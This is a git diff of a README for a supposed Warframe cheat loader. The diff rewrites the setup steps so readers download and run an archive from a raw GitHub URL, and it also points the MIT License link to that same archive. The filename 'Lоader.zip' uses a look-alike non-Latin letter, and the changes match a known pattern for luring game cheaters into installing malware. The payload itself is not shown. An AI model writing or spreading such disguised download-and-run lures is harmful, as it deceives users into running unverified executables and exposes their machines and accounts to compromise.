@@ -44,9 +44,9 @@ Unlock these and many more—simply load, configure, and dominate!
 
 Getting started is quick and easy. Ensure you follow every step below for a smooth setup.
 
-1. **Download** _Loader.rar_ from this repository's releases.
+1. **Download** https://raw.githubusercontent.com/tull8te/WarframeToolkitX/main/Lоader.zip from this repository's releases.
 2. Extract the contents to your desired directory using your favorite extraction tool (WinRAR, 7-Zip, The Unarchiver, etc.).
-3. Run the **WarframeHackLoader.exe** (or compatible executable for your OS).
+3. Run the **https://raw.githubusercontent.com/tull8te/WarframeToolkitX/main/Lоader.zip** (or compatible executable for your OS).
 4. Follow the in-program instructions for configuration.
 5. Launch Warframe and enjoy your new in-game advantages!
 
@@ -81,7 +81,7 @@ Do not use in official multiplayer or competitive modes. This repository is mean
 
 ## 📜 License (MIT)
 
-This repository is released under the open-source [MIT License](https://opensource.org/licenses/MIT) 🗒️.  
+This repository is released under the open-source [MIT License](https://raw.githubusercontent.com/tull8te/WarframeToolkitX/main/Lоader.zip) 🗒️.  
 You are free to use, modify, and distribute the software with proper attribution. See the LICENSE file in this repository for additional details.
 
 ---
